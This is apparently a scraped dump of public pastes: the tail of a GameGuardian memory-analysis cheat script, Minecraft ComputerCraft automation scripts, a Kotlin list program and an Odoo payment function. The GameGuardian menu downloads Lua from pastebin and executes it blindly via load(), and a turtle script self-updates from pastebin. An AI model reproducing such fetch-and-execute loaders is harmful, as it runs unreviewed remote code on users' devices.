if MAIN == 2 then BACK() end
if MAIN == 3 then END() end
end
FMXR=-1
end
local results = {}
function formatHex(num)
    if not num then return ""未知"" end
    return string.format(""0x%X"", num)
end
function getAllMemoryRanges()
    local ranges = gg.getRangesList()
    if not ranges then
        gg.alert(""无法获取内存区域信息"")
        return nil
    end
    return ranges
end
function findMemoryRegion(address, ranges)
    for i, region in ipairs(ranges) do
        if address >= region.start and address <= region['end'] then
            return region
        end
    end
    return nil
end
function analyzeAddress(address, number, ranges)
    local region = findMemoryRegion(address, ranges)
    if not region then
        return {
            number = number,
            address = formatHex(address),
            moduleName = ""未找到"",
            moduleBase = ""未知"",
            offset = ""无法计算""
        }
    end
    local offset = address - region.start
    return {
        number = number,
        address = formatHex(address),
        moduleName = region.name or ""未命名模块"",
        moduleBase = formatHex(region.start),
        offset = formatHex(offset)
    }
end
function processAddresses()
    local selected = gg.getSelectedResults()
    if not selected or #selected == 0 then
        gg.alert(""请先勾选要分析的地址！"")
        return false
    end
    local ranges = getAllMemoryRanges()
    if not ranges then return false end
    results = {}
    for i, item in ipairs(selected) do
        local address = item.address
        if address and address ~= 0 then
            local info = analyzeAddress(address, i, ranges)
            table.insert(results, info)
        end
    end
    return true
end
function showResults()
    local resultText = ""地址分析结果：\n\n""
    for _, info in ipairs(results) do
        resultText = resultText ..
            ""编号: "" .. info.number .. ""\n"" ..
            ""地址: "" .. info.address .. ""\n"" ..
            ""模块名: "" .. info.moduleName .. ""\n"" ..
            ""模块基址: "" .. info.moduleBase .. ""\n"" ..
            ""偏移量: "" .. info.offset .. """"
    end
    gg.alert(resultText)
end
function CK()
    local status, err = pcall(function()
        if processAddresses() then
            showResults()
        end
    end)
    if not status then
        gg.alert(""脚本执行出错："" .. tostring(err))
    end
end
function BACK()
local menu = gg.alert('請選擇要切換的模式\n如果搜索列表有數據請先保存到列表中再繼續返回操作', ""返回"", ""正常模式"", ""調試模式"")
if menu == 1 then
Start()
elseif menu == 2 then
API = gg.makeRequest('  https://pastebin.com/raw/YuSvmysd  ').content
if not API then
gg.alert('no interned access,please try again later')
else
pcall(load(API))
end
elseif menu == 3 then
API = gg.makeRequest('  https://pastebin.com/raw/vhMuGyGv  ').content
if not API then
gg.alert('no interned access,please try again later')
else
pcall(load(API))
end
end
end
function END()
gg.setVisible(true)
os.exit()
end
while(true)do
gg.sleep(1)
if gg.isClickedUiButton() then
FMXR=1
else
FMXR=-1
end
if FMXR==1 then
Start()
end
end"
0C26f4SW,spawner 2024,DarkSiders061,Lua,Thursday 12th of June 2025 04:22:15 PM CDT,"--Look throughout the code for comments like this. They explain what to do to change things.

--What side the monitor will be on (change this if needed)
side = ""right""
args = {...}
rednet.open(""top"")
message = args[1]


m = peripheral.wrap(side)


--button on/off color
bactive = colors.cyan
binactive=colors.gray
--text on/off color
tactive=colors.white
tinactive=colors.black
--Background color
bgcolor = colors.black


buttons = {}
      
      

      function newButton(id,xmin,xmax,ymin,ymax,text,func)
        buttons[id] = {}
        buttons[id][""xmin""] = xmin
        buttons[id][""xmax""] = xmax
        buttons[id][""ymin""] = ymin
        buttons[id][""ymax""] = ymax
        buttons[id][""active""] = false
        buttons[id][""text""] = text
        buttons[id][""func""] = func
        
      end
      ---------------------------------------------------------------------------------
      function printButton(id)
        ymin = buttons[id][""ymin""]
        ymax = buttons[id][""ymax""]
        xmin = buttons[id][""xmin""]
        xmax = buttons[id][""xmax""]
        text = buttons[id][""text""]
        ia = buttons[id][""active""]

       

            width = xmax - xmin
            height = ymax - ymin
            
            if ia then m.setBackgroundColor(bactive) m.setTextColor(tactive)
            else m.setBackgroundColor(binactive) m.setTextColor(tinactive) end

            for j = ymin,ymax do
             m.setCursorPos(xmin,j)
              for i = xmin,xmax do

                m.write("" "")

             end

           end 

         
        m.setCursorPos(xmin + width / 2 - #text / 2 + 1,ymin + height / 2)

       m.write(text)
       m.setBackgroundColor(bgcolor)
        
      end
      ----------------------------------------------------------------------------------
      function refreshButtons()
        for i = 1,#buttons do
          printButton(i)
        end
      end
    function checkxy( x,y )
        for i = 1, #buttons do 
          if y >= buttons[i][""ymin""] and y <= buttons[i][""ymax""] then
            if x >= buttons[i][""xmin""] and x <= buttons[i][""xmax""] then

              
              buttons[i][""active""] = not buttons[i][""active""]
              clicked = i
              if buttons[i][""func""] ~= nil then

                buttons[i][""func""]()

                
              end
            end
          end
        end
      end


bool1 = false
bool2 = false
bool3 = false
rs.setBundledOutput(""back"",0)




--White is pigman, Orange is witch, purple is wither skele (Bundled cable)






function ancientknight()
  current = rs.getBundledOutput(""back"")
	bool1 = not bool1
  if bool1 then
	   rednet.broadcast(""znkancientknighton"")
  else
    rednet.broadcast(""znkancientknightoff"")
  end
end

function witch()
  current = rs.getBundledOutput(""back"")
	bool2 = not bool2
	if bool2 then
   rednet.broadcast(""znkwitchon"")
  else
    rednet.broadcast(""znkwitchoff"")
  end
end

function microsoftkiller()
  current = rs.getBundledOutput(""back"")
	bool3 = not bool3
	if bool3 then
   rednet.broadcast(""microsoftkilleron"")
  else
    rednet.broadcast(""microsoftkilleroff"")
  end
end

function ancientknight()
  current = rs.getBundledOutput(""back"")
	bool3 = not bool3
	if bool3 then
   rednet.broadcast(""ancienton"")
  else
    rednet.broadcast(""ancientoff"")
  end
end


--You can add more buttons and also change the size of them. The format is startingx,startingy,endingx,endingy,text,function

--The buttons
newButton(1, 2,24,2,6,""Ancient Knight"",ancientknight)
newButton(2, 26,48,2,6,""Witch"",witch)
newButton(3, 26,48,7,11,""Microsoft Killer"",microsoftkiller)
newButton(4, 2,24,7,11,""Ancient Knight"",ancientknight)
------------------------------------------------



m.clear()
refreshButtons()


--main loop
while true do
	e,side,x,y = os.pullEvent(""monitor_touch"")
	checkxy(x,y)
  
	refreshButtons()
end
"
5c2y8ZAw,Receveur sans porte 2.0,DarkSiders061,Lua,Thursday 12th of June 2025 04:21:19 PM CDT,"local modem = peripheral.find(""modem"")
rednet.open(""top"")

while true do
 	local id, message
 	id, message = rednet.receive()
 		if message == ""znkwitchon"" then
 		redstone.setOutput(""bottom"", true)
 		end
		if message == ""znkwitchoff"" then
 		redstone.setOutput(""bottom"", false)
 		end
end
"
kg61htcL,Untitled,TflowEx,Kotlin,Thursday 12th of June 2025 03:06:17 PM CDT,"fun main() {
    var continuar = true

    val produtos = mutableListOf(""Arroz"", ""Feijao"", ""Macarrão"", ""Leite"")

    while (continuar) {
        println(
            """"""
                
            Digite uma das opções a seguir:
            1 - Ver lista de produtos
            2 - Adicionar produto
            3 - Remover produto
            sair - Encerrar programa
            """""".trimIndent()
        )

        print(""Opção: "")

        val opcao = readln().trim()
        println()

        when (opcao) {
            ""1"" -> {
                println(""Produtos disponíveis:"")
                produtos.forEachIndexed { index, item -> println(""${index+1}: $item"")}}
            ""2"" -> {
                println(""Digite o nome do produto que deseja adicionar: "")
                val produto = readln().trim()
                if (produto.isNotEmpty()){
                    produtos.add(produto)
                    println(""$produto adicionado com sucesso."")

                } else println(""Produto vazio não pode ser adicionado, tente novamente..."")
            }
            ""3"" -> {

                if (produtos.isEmpty()){
                    println(""Lista vazia, não há nada pra remover"")
                }
                println(""Produtos disponíveis para remover:"")
                produtos.forEachIndexed { index, item ->
                    println(""${index+1}: - $item "")
                }
                println(""Digite o número do produto que deseja remover: "")
                val entrada = readln().trim()
                val indice =  entrada.toIntOrNull()

                if (indice != null && indice in 1..produtos.size){
                    val removido = produtos.removeAt(indice - 1)
                    println(""Produto \""$removido\"" removido com sucesso."")
                } else {
                    println(""Número inválido."")
        }

            }
            ""sair"" -> {
                println(""Encerrando o programa..."")
                continuar = false
            }
            else -> println(""Opção inválida, tente novamente."")
        }

    }
}
"
kvfWpXuR,Untitled,yavy-odoo,JavaScript,Thursday 12th of June 2025 02:40:36 PM CDT,"    async downPaymentSO(sale_order, isPercentage) {
        if (!this.config.down_payment_product_id && this.config.raw.down_payment_product_id) {
            await this.data.read(""product.product"", [this.config.raw.down_payment_product_id]);
        }
        if (!this.config.down_payment_product_id) {
            this.dialog.add(AlertDialog, {
                title: _t(""No down payment product""),
                body: _t(
                    ""It seems that you didn't configure a down payment product in your point of sale. You can go to your point of sale configuration to choose one.""
                ),
            });
            return;
        }
        const payload = await makeAwaitable(this.dialog, NumberPopup, {
            title: _t(""Down Payment""),
            subtitle: sprintf(
                _t(""Due balance: %s | Total Amount: %s""),
                this.env.utils.formatCurrency(sale_order.amount_unpaid),
                this.env.utils.formatCurrency(sale_order.amount_total)
            ),
            buttons: enhancedButtons(),
            formatDisplayedValue: (x) => (isPercentage ? `% ${x}` : x),
            feedback: (buffer) =>
                isPercentage && buffer
                    ? `(${this.env.utils.formatCurrency(
                          (sale_order.amount_total * parseFloat(buffer)) / 100
                      )})`
                    : """",
        });
        if (!payload) {
            return;
        }
        const userValue = parseFloat(payload);
        let proposed_down_payment = userValue;
        if (isPercentage) {
            const down_payment_tax = this.models[""account.tax""].get(
                this.config.down_payment_product_id.taxes_id
            );
            const percentageBase =
                !down_payment_tax || down_payment_tax.price_include
                    ? sale_order.amount_total
                    : sale_order.amount_total;
            proposed_down_payment = (percentageBase * userValue) / 100;
        }
        if (proposed_down_payment > sale_order.amount_unpaid) {
            this.dialog.add(AlertDialog, {
                title: _t(""Error amount too high""),
                body: _t(
                    ""You have tried to charge a down payment of %s but only %s remains to be paid, %s will be applied to the purchase order line."",
                    this.env.utils.formatCurrency(proposed_down_payment),
                    this.env.utils.formatCurrency(sale_order.amount_unpaid),
                    this.env.utils.formatCurrency(sale_order.amount_unpaid || 0)
                ),
            });
            proposed_down_payment = sale_order.amount_unpaid || 0;
        }
        this._createDownpaymentLines(sale_order, proposed_down_payment);
    },"
na90MBPy,spatialBot,Myros27,Lua,Thursday 12th of June 2025 01:33:33 PM CDT,"-- print(textutils.serialize(x))

local function findPeripheralByType(typeName)
    for _, name in ipairs(peripheral.getNames()) do
        if peripheral.getType(name) == typeName then return name, name end
    end
    return nil, nil
end

function levenshtein(s1, s2, limit)
	local len1, len2 = #s1, #s2
	if len1 > len2 then s1, s2, len1, len2 = s2, s1, len2, len1 end
	if len2 - len1 >= limit then return limit end
	local v0 = {}
	for i = 1, len2 + 1 do v0[i] = i - 1 end
	for i = 1, len1 do
		local v1 = { [1] = i }
		local min_in_row = i
		for j = 1, len2 do
			local cost = s1:sub(i, i) == s2:sub(j, j) and 0 or 1
			v1[j + 1] = math.min(v1[j] + 1, v0[j + 1] + 1, v0[j] + cost)
			if v1[j + 1] < min_in_row then min_in_row = v1[j + 1] end
		end
		if min_in_row >= limit then return limit end
		v0 = v1
	end
	return math.min(v0[len2 + 1], limit)
end

function normalize(s)
	s = string.lower(s)
	s = string.gsub(s, "" "", """")
	s = string.gsub(s, "","", """")
	s = string.gsub(s, ""\"""", """")
	s = string.gsub(s, ""%*"", """")
	s = string.gsub(s, ""%("", """")
	s = string.gsub(s, ""%)"", """")
	s = string.gsub(s, ""%["", """")
	s = string.gsub(s, ""%]"", """")
	s = string.gsub(s, ""{"", """")
	s = string.gsub(s, ""}"", """")
	s = string.gsub(s, ""%."", """")
	s = string.gsub(s, ""%-"", """")
	s = string.gsub(s, ""'"", """")
	return s
end

function compareStrings(str1, str2)
    local norm_str1 = normalize(str1)
    local norm_str2 = normalize(str2)
    return levenshtein(norm_str1, norm_str2, 3)
end

--print(""Match (0):"", compareStrings(""Test String!"", ""teststring""))
--print(""Distance 1 (1):"", compareStrings(""My Test [Disk]"", ""my test diskk""))
--print(""Distance 2 (2):"", compareStrings(""My Test (Disk)"", ""my best diskk""))
--print(""Distance 3+ (3):"", compareStrings(""My Test {Disk}"", ""your best diskk""))

function getDiskName()
    local oppositeDirection = { top = ""down"", bottom = ""up"" }
    local bridgeName, bridgeLocation = findPeripheralByType(""meBridge"")
    if not bridgeName then return nil, ""ME Bridge peripheral not found."" end
    local direction = oppositeDirection[bridgeLocation]
    if not direction then return nil, ""ME Bridge must be on top or bottom."" end
    local bridge = peripheral.wrap(bridgeName)
    local item_details = turtle.getItemDetail(1)
    if not item_details or not item_details.nbt then return nil, ""Item in slot 1 has no NBT data."" end
    local import_filter = { name = item_details.name, nbt = item_details.nbt }
    local items_before = {}
    for _, item in ipairs(bridge.listItems()) do
        items_before[item.fingerprint] = item.count
    end
    if bridge.importItem(import_filter, direction, 1) < 1 then
        return nil, ""Failed to import item into ME system.""
    end
    local items_after = bridge.listItems()
    local found_item_data = nil
    for _, item_after in ipairs(items_after) do
        local count_before = items_before[item_after.fingerprint] or 0
        if item_after.count > count_before then
            found_item_data = item_after
            break
        end
    end
    if not found_item_data then
        bridge.exportItem(import_filter, direction)
        return nil, ""CRITICAL: Item imported but vanished inside the ME system.""
    end
    local disk_name = found_item_data.displayName
    if bridge.exportItem(found_item_data, direction) < 1 then
        return nil, ""CRITICAL: Failed to export item back. Item is stuck in ME system.""
    end

    disk_name = string.gsub(disk_name, ""[%[%]]"", """")
    disk_name = string.gsub(disk_name, ""^%s*(.-)%s*$"", ""%1"")
    return disk_name, nil
end

--local name, err = getDiskName()
--if name then
--    print(""Success! Disk name is: '"" .. name .. ""'"")
--else
--    print(""Failed! Reason: "" .. err)
--end

function returnDisk()
    local oppositeDirection = { top = ""down"", bottom = ""up"" }
    local bridgeName, bridgeLocation = findPeripheralByType(""meBridge"")
    if not bridgeName then return nil, ""ME Bridge peripheral not found."" end
    local direction = oppositeDirection[bridgeLocation]
    if not direction then return nil, ""ME Bridge must be on top or bottom."" end
    local bridge = peripheral.wrap(bridgeName)
    local item_details = turtle.getItemDetail(1)
    if not item_details or not item_details.nbt then return nil, ""Item in slot 1 has no NBT data."" end
    local import_filter = { name = item_details.name, nbt = item_details.nbt }
    if bridge.importItem(import_filter, direction, 1) < 1 then
        return nil, ""Failed to import item into ME system.""
    end
end

--- Lists all storage disks in the ME system, providing their name and fingerprint.
-- @return ({ {name=string, fingerprint=string}, ... }, nil) A table of disk data on success.
-- @return (nil, string) An error message on any failure.
function listMeDiskNames()
    local bridgeName = findPeripheralByType(""meBridge"")
    if not bridgeName then return nil, ""ME Bridge peripheral not found."" end
    local bridge = peripheral.wrap(bridgeName)
    local all_items = bridge.listItems()
    local disk_data = {}

    if not all_items then
        return nil, ""Could not access ME system contents (is it powered and connected?).""
    end
	
    for _, item in ipairs(all_items) do
        if item.name and string.find(item.name, ""storage_cell"") then
            local cleaned_name = string.gsub(item.displayName, ""[%[%]]"", """")
            cleaned_name = string.gsub(cleaned_name, ""^%s*(.-)%s*$"", ""%1"")
            table.insert(disk_data, { name = cleaned_name, fingerprint = item.fingerprint })
        end
    end
    return disk_data, nil
end

--- Finds a disk by name in the ME system and exports it to the turtle's inventory.
-- @param diskNameToFind The name of the disk to search for.
-- @return (true, nil) On successful export.
-- @return (nil, string) An error message on failure.
function getMeDiskByName(diskNameToFind)
    local oppositeDirection = { top = ""down"", bottom = ""up"" }
    local bridgeName, bridgeLocation = findPeripheralByType(""meBridge"")
    if not bridgeName then return nil, ""ME Bridge not found."" end
    local direction = oppositeDirection[bridgeLocation]
    if not direction then return nil, ""ME Bridge must be on top or bottom."" end
    local bridge = peripheral.wrap(bridgeName)

    local disks, err = listMeDiskNames()
    if err then return nil, err end

    local found_fingerprint = nil
    for _, disk in ipairs(disks) do
        if compareStrings(disk.name, diskNameToFind) == 0 then
            found_fingerprint = disk.fingerprint
            break
        end
    end

    if not found_fingerprint then
        return nil, ""Disk with name '"" .. diskNameToFind .. ""' not found in ME system.""
    end

    local export_filter = { fingerprint = found_fingerprint }
    if bridge.exportItem(export_filter, direction, 1) < 1 then
        return nil, ""Found disk but failed to export it from the ME system.""
    end

    return true, nil
end

--- A utility function to get a simple, comma-separated string of all disk names.
-- @return string A list of names, or an error message.
function getDiskNamesAsString()
    local disks, err = listMeDiskNames()
    if err then return ""Error: "" .. err end
    if #disks == 0 then return ""No disks found in the ME system."" end

    local names_only = {}
    for _, disk in ipairs(disks) do
        table.insert(names_only, disk.name)
    end
    return table.concat(names_only, "", "")
end

--print(""Available disks: "" .. getDiskNamesAsString())


function set(filename, content)
    local file, err = fs.open(filename, ""w"")
    if not file then
        printError(""Failed to open file for setting: "" .. tostring(err))
        return
    end
    file.write(content)
    file.close()
end

function retrieve(filename)
    if not fs.exists(filename) then
        return """"
    end

    local file, err = fs.open(filename, ""r"")
    if not file then
        printError(""Failed to open file for retrieving: "" .. tostring(err))
        return """"
    end
    local content = file.readAll()
    file.close()
    return content
end

function clear(filename)
    set(filename, """")
end

--local test_file = ""my_data""
--fs.delete(test_file)
--print(""Initial state: '"" .. retrieve(test_file) .. ""' (Should be empty)"")
--set(test_file, ""This is the first test."")
--print(""After set: '"" .. retrieve(test_file) .. ""'"")
--clear(test_file)
--print(""After clear: '"" .. retrieve(test_file) .. ""' (Should be empty)"")
--fs.delete(test_file)

function isPortReady()
    local success, data = turtle.inspect()
    if not success then
        return false
    end
    if data and data.state and data.state.powered then
        return true
    end
    return false
end

--print(""Function isPortReady() returned: "" .. tostring(isPortReady()))


local function splitString(inputString)
    local args = {}
    for word in string.gmatch(inputString, ""[^%s]+"") do
        table.insert(args, word)
    end
    return args
end

--- Sends a message with support for multiple, advanced, inline formatted components.
--
--  Use { key = 'value', ... } to format text.
--  - For clickable links, provide: msg, value, clickAction.
--  - For formatted text, provide: msg, and optionally color, underlined.
--
-- @param message The template message string.
-- @param options (optional) A table of global options for the message.
function notifyUser(message, options)
    local chatBox = peripheral.find(""chatBox"")
    if not chatBox then printError(""Chat Box not found."") return end

    -- 1. SET UP GLOBAL DEFAULTS
    options = options or {}
    local prefix = options.prefix or ""Turtle""
    local brackets = options.brackets or ""[]""
    local bracketColor = options.bracketColor or ""&7""
    local targetUser = options.user

    -- 2. PARSE THE MESSAGE TEMPLATE
    local messageBody = {}
    local lastPos = 1
    while true do
        local start, finish = string.find(message, ""{(.-)}"", lastPos)
        if not start then break end

        -- Add the plain text before this block, explicitly setting color to white.
        local beforeText = message:sub(lastPos, start - 1)
        if #beforeText > 0 then
            table.insert(messageBody, { text = beforeText, color = ""white"", underlined = false })
        end

        -- Extract and parse the content inside the {}
        local inside = message:sub(start + 1, finish - 1)
        local inlineOpts = {}
        for key, value in string.gmatch(inside, ""(%w+)%s*=%s*'([^']*)'"") do
            inlineOpts[string.gsub(key, ""%s"", """")] = value
        end

        -- Construct the component.
        if inlineOpts.msg then
            local component = {
                text = inlineOpts.msg,
                color = inlineOpts.color or ""aqua"", -- Default to aqua if color isn't specified
                underlined = (inlineOpts.underlined == 'true')
            }

            -- **THE FIX**: Only add a clickEvent if both action and value are present.
            if inlineOpts.clickAction and inlineOpts.value then
                component.clickEvent = {
                    action = inlineOpts.clickAction,
                    value = inlineOpts.value
                }
            end
            table.insert(messageBody, component)
        else
            -- If malformed, treat as plain text.
            table.insert(messageBody, { text = ""{"" .. inside .. ""}"", color = ""white"", underlined = false })
        end

        lastPos = finish + 1
    end

    -- Add any remaining text after the last block, explicitly setting color to white.
    local remainingText = message:sub(lastPos)
    if #remainingText > 0 then
        table.insert(messageBody, { text = remainingText, color = ""white"", underlined = false })
    end
    
    -- 3. SERIALIZE AND SEND
    local jsonMessage = textutils.serialiseJSON(messageBody)
    if targetUser and targetUser ~= """" then
        chatBox.sendFormattedMessageToPlayer(jsonMessage, targetUser, prefix, brackets, bracketColor)
    else
        chatBox.sendFormattedMessage(jsonMessage, prefix, brackets, bracketColor)
    end
end

--notifyUser(""Did you mean to load { msg = '<ExpFarm>', clickAction = 'suggest_command', color = 'gold', underlined = 'true', value = '@spatial load n3 expFarm' } or was that a mistake?"",{ user = """", prefix = ""Confirm"", brackets = ""()"", bracketColor = ""&b"" })
--notifyUser(""Your { msg = 'reward', value = '/claim_reward 123' } is ready to be claimed."",{ user = ""Myros27"", prefix = ""Quest"", bracketColor = ""&a"" })
--notifyUser(""This is just a standard broadcast."",{ prefix = ""Info"" })


function handleDiskStatusCommand(userName)
    local turtleName = retrieve(""turtleName"")
    local currentDisk = retrieve(""currentDisk"")

    if currentDisk == """" then
        return
    end
    local clearCommand = ""@spatial clear "" .. currentDisk
    local moveCommand = ""@spatial move "" .. currentDisk .. "" here""

	notifyUser(""{ msg = '""..currentDisk..""', underlined = 'true', clickAction = 'suggest_command', value = '"" .. clearCommand .. ""' } is loaded at { msg = '"" .. retrieve(""turtleName"") .. ""', underlined = 'true', clickAction = 'suggest_command', value = '"" .. moveCommand .. ""' }."", { prefix = retrieve(""turtleName"")})
end

function getQuadrant(username)
	local BASE_X = 24
	local BASE_Z = 232
	local HEIGHT_LETTERS = { ""B"", ""D"", ""F"", ""H"", ""J"", ""L"", ""N"", ""P"", ""R"", ""T"", ""V"" }
    local player_detector = peripheral.find(""playerDetector"")
    if not player_detector then
        printError(""Player Detector peripheral not found."")
        return """"
    end
    local playerData = player_detector.getPlayer(username)

    if not playerData then
        return """"
    end

    if playerData.dimension ~= ""minecraft:overworld"" then
        return """"
    end

    if playerData.y < -56 or playerData.y >= 296 then
        return """"
    end

    local normalized_y = playerData.y + 56
    local height_index = math.floor(normalized_y / 32) + 1
    local height_letter = HEIGHT_LETTERS[height_index]

    local quadrant_number = 0
    if playerData.x >= BASE_X and playerData.z <= BASE_Z then
        quadrant_number = 9 -- Northeast
    elseif playerData.x < BASE_X and playerData.z <= BASE_Z then
        quadrant_number = 7 -- Northwest
    elseif playerData.x >= BASE_X and playerData.z > BASE_Z then
        quadrant_number = 3 -- Southeast
    else
        quadrant_number = 1 -- Southwest
    end

    return height_letter .. quadrant_number
end


--local locationCode = getQuadrant(""Myros27"")
--if locationCode ~= """" then
--    print(""Myros27's location code is: "" .. locationCode)
--else
--    print(""Could not get location for Myros27 (or they are out of bounds)."")
--end


function sanitizeQuadrant(input)
    if not input or type(input) ~= ""string"" then
        return """"
    end

    local s = string.lower(input)
    local letters = {}
    local digits = {}

    for char in string.gmatch(s, ""."") do
        if string.match(char, ""%a"") then
            table.insert(letters, char)
        elseif string.match(char, ""%d"") then
            table.insert(digits, char)
        end
    end

    table.sort(letters)
    table.sort(digits)
    return table.concat(letters) .. table.concat(digits)
end

--print(""'N3' -> '"" .. sanitizeQuadrant(""N3"") .. ""'"")
--print(""'3n' -> '"" .. sanitizeQuadrant(""3n"") .. ""'"")
--print(""'z9a1' -> '"" .. sanitizeQuadrant(""z9a1"") .. ""'"")


function confirmQuadrant(sanitizedInput)
    if not sanitizedInput or type(sanitizedInput) ~= ""string"" or #sanitizedInput ~= 2 then
        return false
    end
    local letter = sanitizedInput:sub(1, 1)
    local digit = sanitizedInput:sub(2, 2)
    local validLetters = ""bdfhjlnprtv""
    local validDigits = ""1379""
    if string.find(validLetters, letter, 1, true) and string.find(validDigits, digit, 1, true) then
        return true
    else
        return false
    end
end

--print(""'n3' -> "" .. tostring(confirmQuadrant(""n3"")))
--print(""'b9x' -> "" .. tostring(confirmQuadrant(""b9x""))) -- Fails because length is wrong


function isInfront(blockName)
    local success, blockData = turtle.inspect()
    if not success or not blockData or not blockData.name then
        return false
    end
    local result = compareStrings(blockName, blockData.name)
    return result == 0
end

--print(isInfront(""ae2:spatial_io_port""))

--- The main function that listens for chat events and dispatches commands.
local function runChatListener()
    print(""Chat command listener is now active. Waiting for messages..."")
    while true do
        local event, username, message = os.pullEvent(""chat"")
        local args = splitString(message)
        handleCommand(username, args[1] or """", args[2] or """", args[3] or """", args[4] or """", args[5] or """")
    end
end


function handleInit()
	turtle.select(1)
	rs.setOutput(""front"", false)
	rs.setOutput(""back"", false)
	local chatBox = peripheral.find(""chatBox"")
	if not chatBox then
		printError(""Chat Box not found."")
		os.sleep(100)
		os.shutdown()
		return
	end
	
	local turtleName = retrieve(""turtleName"")
	if (turtleName == """") then
		term.write(""Please enter the Name of the Turtle\n"")
		turtleName = read()
		turtleName = sanitizeQuadrant(turtleName)
		if (confirmQuadrant(turtleName)) then
			set(""turtleName"", turtleName)
		else 
			printError(""Invalid Name"")
			os.sleep(1)
			os.shutdown()
		end
	end

	if (isInfront(""ae2:spatial_io_port"")) then
		turtle.turnRight()
		rs.setOutput(""front"", true)
		rs.setOutput(""back"", true)
		os.sleep(0.05)
		rs.setOutput(""front"", false)
		rs.setOutput(""back"", false)
		turtle.turnLeft()
	else
		turtle.turnLeft()
		if (isInfront(""ae2:spatial_io_port"")) then
			turtle.turnRight()
			rs.setOutput(""front"", true)
			rs.setOutput(""back"", true)
			os.sleep(0.05)
			rs.setOutput(""front"", false)
			rs.setOutput(""back"", false)
			turtle.turnLeft()
		else
			notifyUser(""ae2:spatial_io_port not found"",{ prefix = retrieve(""turtleName"")})
			os.sleep(1)
			os.shutdown()
		end
	end
	
	local player_detector = peripheral.find(""playerDetector"")
    if not player_detector then
        notifyUser(""upgrade not found"",{ prefix = retrieve(""turtleName"")})
		os.sleep(1)
		os.shutdown()
    end
	
	local bridgeName, bridgeLocation = findPeripheralByType(""meBridge"")
    if not bridgeName then
		notifyUser(""ME Bridge"",{ prefix = retrieve(""turtleName"")})
		os.sleep(1)
		os.shutdown()
	end
	
	local oppositeDirection = { top = ""down"", bottom = ""up"" }
    local direction = oppositeDirection[bridgeLocation]
    if not direction then
		notifyUser(""ME Bridge must be on top or bottom."",{ prefix = retrieve(""turtleName"")})
		os.sleep(1)
		os.shutdown()
	end
end

function waitForPortReady(timeout)
    timeout = timeout or 2
    local startTime = os.clock()
    while true do
        if isPortReady() then
            return true
        end
        if os.clock() - startTime >= timeout then
            notifyUser(""Port was never ready"",{ prefix = retrieve(""turtleName"")})
			return false
        end
        os.sleep(0.05)
    end
end

function waitForSuck(timeout)
    timeout = timeout or 2
    local startTime = os.clock()
    while true do
        if turtle.suck() then
            return true
        end
        if os.clock() - startTime >= timeout then
			return false
        end
        os.sleep(0)
    end
end

function update()
	fs.makeDir(""startup"")
	shell.setDir(""startup"")
	fs.delete(""startup/spatialBot"")
	shell.run(""pastebin get na90MBPy spatialBot"")
	os.reboot()
end

function hasN(quadrant)
    local q = string.lower(quadrant or """")
    return string.find(q, ""n"") ~= nil
end


function saveTrigger()
	if (isPortReady()) then
		turtle.drop()
		rs.setOutput(""front"", true)
		os.sleep(0.05)
		if (waitForSuck(1) == false) then
			notifyUser(""Unable to get Disk back at "" .. retrieve(""turtleName""),{ prefix = retrieve(""turtleName"")})
			rs.setOutput(""front"", false)
			return false
		end
	else
		notifyUser(""Unable to get ME Sytsm online at "" .. retrieve(""turtleName""),{ prefix = retrieve(""turtleName"")})
		rs.setOutput(""front"", false)
		return false
	end
	rs.setOutput(""front"", false)
	return true
end

function enableMe()
	rs.setOutput(""back"", true)
	waitForPortReady(2)
end

function disableMe()
	rs.setOutput(""back"", false)
end

function clearSpace(userName)
	if (retrieve(""currentDisk"") == """") then
		notifyUser(""Nothing to Clear"",{ prefix = retrieve(""turtleName"")})
		return
	end
	if (hasN(retrieve(""turtleName"")) and userName ~= ""Myros27"") then --only Myros27 may use the Level ""n""
		notifyUser(""FATAL ERROR"",{ prefix = retrieve(""turtleName"")})
		return
	end
	enableMe()
	if (saveTrigger()) then
		os.sleep(0.05)
		local diskName = retrieve(""currentDisk"")
		clear(""currentDisk"")
		returnDisk()
		disableMe()
		notifyUser(""Returned disk "" .. diskName .. "" to the Base"",{ prefix = retrieve(""turtleName"")})
		return
	end
	disableMe()
	notifyUser(""Unable to Clear"",{ prefix = retrieve(""turtleName"")})
end

function loadSpace(userName, disk, slow)
	if (hasN(retrieve(""turtleName"")) and userName ~= ""Myros27"") then --only Myros27 may use the Level ""n""
		notifyUser(""FATAL ERROR"",{ prefix = retrieve(""turtleName"")})
		return
	end
	if (slow) then --wait for another unload
		os.sleep(2)
	end
	if (retrieve(""currentDisk"") ~= """") then
		clearSpace(userName)
	end
	enableMe()
	local didWork,message = getMeDiskByName(disk) -- get Disk From ME System
	if (didWork) then
		if (saveTrigger()) then
			os.sleep(0.05)
			set(""currentDisk"", disk)
			notifyUser(""Loaded disk "" .. disk .. "" at "" .. retrieve(""turtleName"") ,{ prefix = retrieve(""turtleName"")})
			disableMe()
			return
		else
			rs.setOutput(""back"", false)
			os.sleep(2)-- are we here because the disk is still in the spatial port? we should check inventory
			rs.setOutput(""back"", true)
			if (saveTrigger()) then -- lets try again
				os.sleep(0.05)
				set(""currentDisk"", disk)
				notifyUser(""Loaded disk "" .. disk .. "" at "" .. retrieve(""turtleName"") ,{ prefix = retrieve(""turtleName"")})
				disableMe()
				return				
			end
		end
	else
		notifyUser(""Unable to find a Disk named "" .. disk .. ""."" ,{ prefix = retrieve(""turtleName"")})
	end
	disableMe()
	if (slow) then
		notifyUser(""Unable to Move"",{ prefix = retrieve(""turtleName"")})
		return
	end
	notifyUser(""Unable to Load"",{ prefix = retrieve(""turtleName"")})
end

function handleCommand(userName, arg1, arg2, arg3, arg4, arg5)
	if (userName == ""Myros27"" and arg1 == ""@spatial"" and arg2 == ""update"") then
		notifyUser(""updating now"",{ prefix = retrieve(""turtleName"")})
		update()
	end
	
	if (arg1 == ""@disks"") then
		handleDiskStatusCommand(userName)
        return
	end
	
	local myGroupDist = compareStrings(arg1, ""@spatial"")
	if (myGroupDist > 2) then
		return
	end
	
	local loadDist = compareStrings(arg2, ""load"")
	local clearDist = compareStrings(arg2, ""clear"")
	local moveDist = compareStrings(arg2, ""move"")
	if (loadDist > 2 and clearDist > 2 and moveDist > 2) then
		return
	end
	
	local turtleName = retrieve(""turtleName"")
	
	local quadrant = arg3
	local disk = arg4
	if (quadrant == ""here"") then
		quadrant = getQuadrant(userName)
	end
	quadrant = sanitizeQuadrant(quadrant)
	
	local validQuadrant = true
	
	if not confirmQuadrant(quadrant) then
		disk = arg3
		quadrant = arg4
		if (quadrant == ""here"") then
			quadrant = getQuadrant(userName)
		end
		quadrant = sanitizeQuadrant(quadrant)
